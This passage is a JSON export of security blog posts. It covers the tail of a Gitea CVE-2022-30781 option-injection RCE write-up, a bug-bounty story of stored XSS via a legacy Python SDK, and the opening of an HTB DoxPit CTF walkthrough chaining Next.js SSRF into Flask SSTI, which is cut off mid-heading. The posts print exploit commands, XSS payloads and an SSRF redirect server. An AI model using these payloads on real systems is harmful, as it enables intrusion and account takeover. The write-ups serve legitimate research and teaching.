string\">\"</span></span><span class=\"token punctuation\">,</span>  \n                <span class=\"token string\">\"repo\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span>  \n                    <span class=\"token string\">\"clone_url\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"./\"</span><span class=\"token punctuation\">,</span>  \n                    <span class=\"token string\">\"owner\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"login\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"master\"</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  \n                <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  \n            <span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  \n            <span class=\"token string\">\"updated_at\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"2001-01-01T05:00:00+01:00\"</span><span class=\"token punctuation\">,</span>  \n            <span class=\"token string\">\"user\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">,</span>  \n        <span class=\"token punctuation\">}</span>  \n    <span class=\"token punctuation\">]</span>\n</code></pre></div>\n<p>As you can see in the pulls endpoint, I was able to inject the  <code>--upload-pack</code>  option into the  <code>ref</code>, which corresponds to the pull request's base branch.</p>\n<p>Now, let’s test it. I ran the API, created a new migration in Gitea, and set the repository URL to  <code>myapi/test/test</code>. Additionally, I enabled the option to fetch pull requests, ensuring that it pulls the repository's pull requests during the migration process</p>\n<p>And as you can See :)</p>\n<p><a href=\"https://www.youtube.com/watch?v=9KOjRB9IKSo\"><img src=\"https://img.youtube.com/vi/9KOjRB9IKSo/0.jpg\" alt=\"VIDEO POC\"></a></p>\n<p>In the background, the following command was executed:<br>\n<code>$ git fetch origin --upload-pack='curl &#x3C;host>'</code></p>\n<p>This caused Gitea to make the specified  <code>curl</code>  request, demonstrating that the RCE was successfully exploited as a proof of concept (PoC)</p>\n<h2>Patching the bug</h2>\n<p>Gitea team fixed this bug by using  <code>--</code>, which forces Git to treat everything following it as a plain string rather than a parsable option, This effectively resolves the issue.</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:1000/1*lreFlMwsoRz_970hBC3siA.png\" alt=\"\"></p>\n<p>And that’s it! I hope you found this helpful.</p>\n<p>You can access the testing lab and the exploit at:<br>\n<a href=\"https://github.com/MindPatch/latestpocs\">latestpocs/CVE-2022–30781/gitea_poc at master · MindPatch/latestpocs</a></p>\n<p>Take care, and see you next time! 🙂</p>\n",
    "tags": [
      "Gitea",
      "RCE",
      "git",
      "research",
      "cve"
    ],
    "author": "MindPatch"
  },
  {
    "slug": "legacy-sdk-xss-account-takeover",
    "title": "Legacy SDK Flaws Cause Stored XSS and Account Takeover",
    "date": "2025-03-14",
    "excerpt": "A casual day of hunting bugs turned into a serious jackpot thanks to some forgotten open source library. This vulnerability allowed for complete account takeover through stored XSS.",
    "content": "<p><img src=\"https://miro.medium.com/v2/resize:fit:480/0*wFXpWUgkd4CNm-ov.gif\" alt=\"\"></p>\n<p>—</p>\n<p>Alright, let me tell you a fun story about how a casual day of hunting bugs turned into a serious jackpot — all thanks to some forgotten open source library!</p>\n<p>It started like any other day: coffee ready, Burp Suite fired up, and enthusiasm maxed out. I was testing a cool AI-driven reporting/training platform over at example.ai.</p>\n<p>These folks were pretty solid when it came to securing their main endpoints; my usual payloads and tests didn’t reveal much initially. However, the moment I stumbled onto their  <code>/reports</code>  page, my curiosity went through the roof. This page was super interactive—it allowed users to create detailed, professional-looking reports with graphs, charts, images, markdown support, etc ..</p>\n<p>I tried finding any bugs on this feature but didn’t ended well unfortunately</p>\n<p>But after searching around their github organization repos I found a library called  <code>utils_libs</code> and its README.md says that let you create report using python in automated way</p>\n<p>and I revealed two versions of their report library:  <code>utils.report.v1</code>  and  <code>utils_libs.report.v2</code>. Considering organizations often neglect older SDK versions during updates, I wondered whether the older  <code>v1</code>  endpoint might still be active</p>\n<p>Curiosity piqued, I quickly whipped up a test script using the old, seemingly abandoned  <code>v1</code>  API:</p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> utils_libs  \n<span class=\"token keyword\">import</span> utils_libs<span class=\"token punctuation\">.</span>reports<span class=\"token punctuation\">.</span>v1 <span class=\"token keyword\">as</span> ul\n\n<span class=\"token comment\"># Setup credentials  </span>\nentity <span class=\"token operator\">=</span> <span class=\"token string\">\"&#x3C;REPLACE>\"</span>  \nproject <span class=\"token operator\">=</span> <span class=\"token string\">\"&#x3C;REPLACE>\"</span><span class=\"token comment\"># Creating a sneaky report  </span>\nreport <span class=\"token operator\">=</span> ul<span class=\"token punctuation\">.</span>Report<span class=\"token punctuation\">(</span>  \n    entity<span class=\"token operator\">=</span>entity<span class=\"token punctuation\">,</span>  \n    project<span class=\"token operator\">=</span>project<span class=\"token punctuation\">,</span>  \n    title<span class=\"token operator\">=</span><span class=\"token string\">\"XSS HERE BE AWARE\"</span><span class=\"token punctuation\">,</span>  \n    description<span class=\"token operator\">=</span><span class=\"token string\">\"Never gonna give you up, never gonna let you down\"</span>  \n<span class=\"token punctuation\">)</span><span class=\"token comment\"># Injecting our little surprise  </span>\nreport<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre></div>\n<p>after running the script I got the report created on the UI successfully.</p>\n<p>I add burpsuite in the mid of the library requests to track it down and I noticed it calls  <strong>different endpoints</strong>!</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:320/0*A4q6356PxRgZBIKH.gif\" alt=\"\"></p>\n<p>When using this endpoint, there is no XSS (Cross-Site Scripting) filter applied to functions that are intended to add links for the report writer. Below is an example of how this vulnerability can be exploited:</p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> utils_libs  \n<span class=\"token keyword\">import</span> utils_libs<span class=\"token punctuation\">.</span>reports<span class=\"token punctuation\">.</span>v1 <span class=\"token keyword\">as</span> ul\n\n<span class=\"token comment\"># Initialize the utils_libs API  </span>\napi <span class=\"token operator\">=</span> utils_libs<span class=\"token punctuation\">.</span>Api<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># Define the entity and project  </span>\nentity <span class=\"token operator\">=</span> <span class=\"token string\">\"&#x3C;REPLACE>\"</span>  <span class=\"token comment\"># Replace with your utils_libs entity  </span>\nproject <span class=\"token operator\">=</span> <span class=\"token string\">\"&#x3C;REPLACE>\"</span>  <span class=\"token comment\"># Replace with your utils_libs project# Create a new report  </span>\nreport <span class=\"token operator\">=</span> ul<span class=\"token punctuation\">.</span>Report<span class=\"token punctuation\">(</span>  \n    entity<span class=\"token operator\">=</span>entity<span class=\"token punctuation\">,</span>  \n    project<span class=\"token operator\">=</span>project<span class=\"token punctuation\">,</span>  \n    title<span class=\"token operator\">=</span><span class=\"token string\">\"XSS HERE - BE AWARE\"</span><span class=\"token punctuation\">,</span>  \n    description<span class=\"token operator\">=</span><span class=\"token string\">\"Never gonna give you up, never gonna let you down\"</span>  \n<span class=\"token punctuation\">)</span><span class=\"token comment\"># Add a block with an XSS payload  </span>\nreport<span class=\"token punctuation\">.</span>blocks <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ul<span class=\"token punctuation\">.</span>Twitter<span class=\"token punctuation\">(</span><span class=\"token string\">'\">&#x3C;svg/onload=alert()>'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token comment\"># Save the report  </span>\nreport<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre></div>\n<p>This code successfully stored an XSS payload, which can be accessed via the URL  <code>example.ai/reports/&#x3C;reportid></code>. Notably, this report can be viewed by anyone, even if they are not part of my organization</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:480/0*XxPwaT6DwUAgyTLX.gif\" alt=\"\"></p>\n<h1>But wait, there’s more!</h1>\n<p>After the excitement of the first payout wore off, I thought, “why not dig a bit deeper?”</p>\n<p>Revisiting their repository, I found another interesting feature — embedding videos into reports. Now, embedding videos seemed innocent enough, but experience taught me never to underestimate innocent-looking functionalities.</p>\n<p>So, I gave it a try:</p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\">report <span class=\"token operator\">=</span> ul<span class=\"token punctuation\">.</span>Report<span class=\"token punctuation\">(</span>  \n    entity<span class=\"token operator\">=</span>entity<span class=\"token punctuation\">,</span>  \n    project<span class=\"token operator\">=</span>project<span class=\"token punctuation\">,</span>  \n    title<span class=\"token operator\">=</span><span class=\"token string\">\"Another Sneaky XSS\"</span><span class=\"token punctuation\">,</span>  \n    description<span class=\"token operator\">=</span><span class=\"token string\">\"Keep calm and hack responsibly\"</span>  \n<span class=\"token punctuation\">)</span>  \nreport<span class=\"token punctuation\">.</span>pages <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>ul<span class=\"token punctuation\">.</span>Video<span class=\"token punctuation\">(</span><span class=\"token string\">'javascript:alert()'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span>  \nreport<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n</code></pre></div>\n<p>And bingo! Another stored XSS! But this wasn’t just any simple vulnerability — this time, it was even more impactful.</p>\n<p>By chaining this XSS with another minor misconfiguration, I escalated it to  <strong>full account takeover</strong>.</p>\n<p>That meant I could completely control someone’s account just by tricking them into viewing my crafted report.</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*k2U5b8qynuKX3XRR7LOQOQ.png\" alt=\"\"></p>\n<p>The team this time higher the impact and higher the bounty which is a good win</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:480/0*9HkGy1bjg5R6HlE9.gif\" alt=\"\"></p>\n<h2>Side Hint:</h2>\n<p>Always dig deeper into seemingly unrelated or forgotten resources. Old API docs, outdated Python SDKs, archived repositories, or forgotten JavaScript files might contain hidden parameters or endpoints. These endpoints often bypass filters or security checks because they aren’t actively maintained, potentially leading to undiscovered vulnerabilities.</p>\n<p>And that’s it</p>\n<p>Bye ..</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:379/0*-Pc5vZ1KCEfJFa0o.gif\" alt=\"\"></p>\n",
    "tags": [
      "XSS",
      "Account Takeover",
      "SDK",
      "Bug Bounty"
    ],
    "author": "MindPatch"
  },
  {
    "slug": "solving-doxpit-challenge",
    "title": "Solving DoxPit Challenge",
    "date": "2024-08-05",
    "excerpt": "HTB DoxPit challenge walkthrough featuring a mix of vulnerabilities in Flask and NextJS applications. A methodical approach to exploiting web application flaws.",
    "content": "<h1>[HTB] Solving DoxPit Challange</h1>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*tWUMuT1J0TUSBua9hOmWcg.png\" alt=\"\"></p>\n<p>In this write-up, I’ll walk you through the process of solving the HTB DoxPit challenge</p>\n<p>This challenge features a mix of vulnerabilities in both a Flask app and a NextJS application through a series of methodical steps, I’ll show you how to exploit these vulnerabilities and successfully capture the flag</p>\n<p>Let’s dive into the details!</p>\n<h1>Getting Started</h1>\n<p>The first step in tackling the DoxPit challenge was to download the provided challenge code. This code revealed two distinct folders: one for a NextJS app and the other for a Flask app.</p>\n<p>The Flask app, running locally, was vulnerable to Server-Side Template Injection (SSTI) due to its use of  <code>render_template_string</code></p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># app.py</span>\n<span class=\"token decorator annotation punctuation\">@web<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/home\"</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"POST\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  \n<span class=\"token decorator annotation punctuation\">@auth_middleware</span>  \n<span class=\"token keyword\">def</span> <span class=\"token function\">feed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n  directory <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"directory\"</span><span class=\"token punctuation\">)</span>  \n    \n  <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> directory<span class=\"token punctuation\">:</span>  \n    dirs <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>listdir<span class=\"token punctuation\">(</span>os<span class=\"token punctuation\">.</span>getcwd<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>  \n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"index.html\"</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span><span class=\"token string\">\"home\"</span><span class=\"token punctuation\">,</span> dirs<span class=\"token operator\">=</span>dirs<span class=\"token punctuation\">)</span>  \n  \n  <span class=\"token keyword\">if</span> <span class=\"token builtin\">any</span><span class=\"token punctuation\">(</span>char <span class=\"token keyword\">in</span> directory <span class=\"token keyword\">for</span> char <span class=\"token keyword\">in</span> invalid_chars<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"error.html\"</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span> error<span class=\"token operator\">=</span><span class=\"token string\">\"invalid directory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span>  \n  \n  <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./application/templates/scan.html\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>  \n        template_content <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  \n        results <span class=\"token operator\">=</span> scan_directory<span class=\"token punctuation\">(</span>directory<span class=\"token punctuation\">)</span>  \n        template_content <span class=\"token operator\">=</span> template_content<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"{{ results.date }}\"</span><span class=\"token punctuation\">,</span> results<span class=\"token punctuation\">[</span><span class=\"token string\">\"date\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  \n        template_content <span class=\"token operator\">=</span> template_content<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">\"{{ results.scanned_directory }}\"</span><span class=\"token punctuation\">,</span> results<span class=\"token punctuation\">[</span><span class=\"token string\">\"scanned_directory\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  \n        <span class=\"token keyword\">return</span> render_template_string<span class=\"token punctuation\">(</span>template_content<span class=\"token punctuation\">,</span> results<span class=\"token operator\">=</span>results<span class=\"token punctuation\">)</span>  \n          \n  <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"error.html\"</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span> error<span class=\"token operator\">=</span>e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span>\n</code></pre></div>\n<p>However, since this app was running locally, our only access was through the NextJS app, which provided the user interface (UI)</p>\n<h1>Identifying the SSRF Vulnerability</h1>\n<p>I took a look at the  <code>package.json</code>  file of the NextJS app and saw that it was using version  <code>14.1.0</code></p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:681/1*dleheh-C-qvDofbc6PZIRA.png\" alt=\"\"></p>\n<p>This version is known to be vulnerable to Server-Side Request Forgery (SSRF) when using the  <code>redirect</code>  function from  <code>next/navigation</code></p>\n<p>Specifically, I found that the  <code>doRedirect</code>  function in  <code>serverAction.tsx</code>, which was used in the home page posts links, utilized this function</p>\n<div class=\"remark-highlight\"><pre class=\"language-js\"><code class=\"language-js\"><span class=\"token string\">\"use server\"</span><span class=\"token punctuation\">;</span>  \n  \n<span class=\"token keyword module\">import</span> <span class=\"token imports\"><span class=\"token punctuation\">{</span> redirect <span class=\"token punctuation\">}</span></span> <span class=\"token keyword module\">from</span> <span class=\"token string\">\"next/navigation\"</span><span class=\"token punctuation\">;</span>  \n  \n<span class=\"token keyword module\">export</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">doRedirect</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>  \n  <span class=\"token function\">redirect</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>  \n<span class=\"token punctuation\">}</span>\n</code></pre></div>\n<div class=\"remark-highlight\"><pre class=\"language-html\"><code class=\"language-html\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&#x3C;</span>form</span> <span class=\"token attr-name\">action</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span>{doRedirect}</span><span class=\"token punctuation\">></span></span>  \n      <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&#x3C;</span>button</span> <span class=\"token attr-name\">className</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>link-light<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>submit<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span>{paste.title}<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&#x3C;/</span>button</span><span class=\"token punctuation\">></span></span>  \n<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&#x3C;/</span>form</span><span class=\"token punctuation\">></span></span>\n</code></pre></div>\n<h1>Exploiting SSRF</h1>\n<p>To exploit this vulnerability, I began by intercepting requests from the home page using Burp Suite, the goal was to modify the  <code>Host</code>  and  <code>Origin</code>  headers to point to my server</p>\n<p>Before diving into this, I added Burp Collaborator to test if I would receive any requests from the application</p>\n<p>This step was crucial to confirm that the application was interacting with my server as expected</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*OIhA8_i0n-duq8g0sNJEVA.png\" alt=\"\"></p>\n<p>And yep got it 🎉</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*vAubxr_uxPh000PCWOZjpg.png\" alt=\"\"></p>\n<p>I then configured Burp Suite to respond with a 302 redirect to  <code>0.0.0.0:3000</code></p>\n<p>To test this, I set up a simple Flask application to serve as a local endpoint</p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># got it from: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io  </span>\n  \n<span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask<span class=\"token punctuation\">,</span> Response<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> redirect  \napp <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span>  \n  \n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span> defaults<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">'path'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">''</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span>  \n<span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/&#x3C;path:path>'</span><span class=\"token punctuation\">)</span>  \n<span class=\"token keyword\">def</span> <span class=\"token function\">catch</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>method <span class=\"token operator\">==</span> <span class=\"token string\">'HEAD'</span><span class=\"token punctuation\">:</span>  \n        resp <span class=\"token operator\">=</span> Response<span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>  \n        resp<span class=\"token punctuation\">.</span>headers<span class=\"token punctuation\">[</span><span class=\"token string\">'Content-Type'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">'text/x-component'</span>  \n        <span class=\"token keyword\">return</span> resp  \n    <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">'http://0.0.0.0:3000'</span><span class=\"token punctuation\">)</span>\n</code></pre></div>\n<h1>Accessing the Internal App</h1>\n<p>After configuring Burp Suite to redirect requests to this local Flask server, I was able to access the internal Flask application running on port 3000</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*SuGoOgMNjUgZC0tKqx-joA.png\" alt=\"\"></p>\n<p>The next step was to interact with the application, starting by registering a new account, as the application required registration for further actions</p>\n<p>The registration endpoint allowed us to create an account using a simple GET request</p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token decorator annotation punctuation\">@web<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/register\"</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">\"GET\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>  \n<span class=\"token keyword\">def</span> <span class=\"token function\">register</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n  username <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span>  \n  password <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"password\"</span><span class=\"token punctuation\">)</span>  \n  \n  <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> username <span class=\"token keyword\">or</span> <span class=\"token keyword\">not</span> password<span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"register.html\"</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span><span class=\"token string\">\"register\"</span><span class=\"token punctuation\">)</span>  \n  \n  db_session <span class=\"token operator\">=</span> Database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  \n  token <span class=\"token operator\">=</span> generate<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>  \n  user_valid <span class=\"token operator\">=</span> db_session<span class=\"token punctuation\">.</span>create_user<span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">,</span> password<span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">)</span>  \n    \n  <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> user_valid<span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"error.html\"</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span> error<span class=\"token operator\">=</span><span class=\"token string\">\"user exists\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">401</span>  \n  \n  <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"error.html\"</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span><span class=\"token string\">\"success\"</span><span class=\"token punctuation\">,</span> error<span class=\"token operator\">=</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"User created with token: </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>token<span class=\"token punctuation\">}</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">200</span>\n</code></pre></div>\n<p>So I changed my server to point to  <code>[http://0.0.0.0:3000/register?username=kebda&#x26;password=3afroto](http://0.0.0.0:3000/register?username=kebda&#x26;password=3afroto)</code></p>\n<p>With the account successfully created, the application returned a session token</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*RcpX5mpj9R-BJDQ5JzBZ3A.png\" alt=\"\"></p>\n<p>Using this token, I could now authenticate and access protected areas of the application, I appended the token to the URL to authenticate:  <code>http://0.0.0.0:3000/home?token=c84964fbd5a45090c841695b2a7d8530</code></p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token comment\"># auth handling function  </span>\n<span class=\"token keyword\">def</span> <span class=\"token function\">auth_middleware</span><span class=\"token punctuation\">(</span>func<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n  <span class=\"token keyword\">def</span> <span class=\"token function\">check_user</span><span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n    db_session <span class=\"token operator\">=</span> Database<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>  \n  \n    <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"loggedin\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n      <span class=\"token keyword\">if</span> request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">and</span> db_session<span class=\"token punctuation\">.</span>check_token<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"token\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n        <span class=\"token keyword\">return</span> func<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span>  \n      <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>  \n        <span class=\"token keyword\">return</span> redirect<span class=\"token punctuation\">(</span><span class=\"token string\">\"/login\"</span><span class=\"token punctuation\">)</span>  \n  \n    <span class=\"token keyword\">return</span> func<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span>  \n  \n  check_user<span class=\"token punctuation\">.</span>__name__ <span class=\"token operator\">=</span> func<span class=\"token punctuation\">.</span>__name__  \n  <span class=\"token keyword\">return</span> check_user\n</code></pre></div>\n<p>This step was crucial, as it allowed me to gain access to the authenticated portions of the site where the SSTI vulnerability could be further exploited:D</p>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*4f-kqARPFX3WrKrr-8s5Sw.png\" alt=\"\"></p>\n<p>let’s jump into  <code>directory</code>  parameter to get this SSTI!</p>\n<p>I initially tried common payloads like  <code>{{1*8}}</code>, but these were blocked due to a blacklist filtering out certain characters:(</p>\n<div class=\"remark-highlight\"><pre class=\"language-python\"><code class=\"language-python\">invalid_chars <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">\"{{\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"}}\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"_\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"[\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"]\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"\\\\\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"x\"</span><span class=\"token punctuation\">]</span>\n \n  <span class=\"token keyword\">if</span> <span class=\"token builtin\">any</span><span class=\"token punctuation\">(</span>char <span class=\"token keyword\">in</span> directory <span class=\"token keyword\">for</span> char <span class=\"token keyword\">in</span> invalid_chars<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>  \n    <span class=\"token keyword\">return</span> render_template<span class=\"token punctuation\">(</span><span class=\"token string\">\"error.html\"</span><span class=\"token punctuation\">,</span> title<span class=\"token operator\">=</span><span class=\"token string\">\"error\"</span><span class=\"token punctuation\">,</span> error<span class=\"token operator\">=</span><span class=\"token string\">\"invalid directory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">400</span>\n</code></pre></div>\n<p><img src=\"https://miro.medium.com/v2/resize:fit:700/1*700MrKoEPGKbv9MKkYGzKg.png\" alt=\"\"></p>\n<h1>Bypassing the 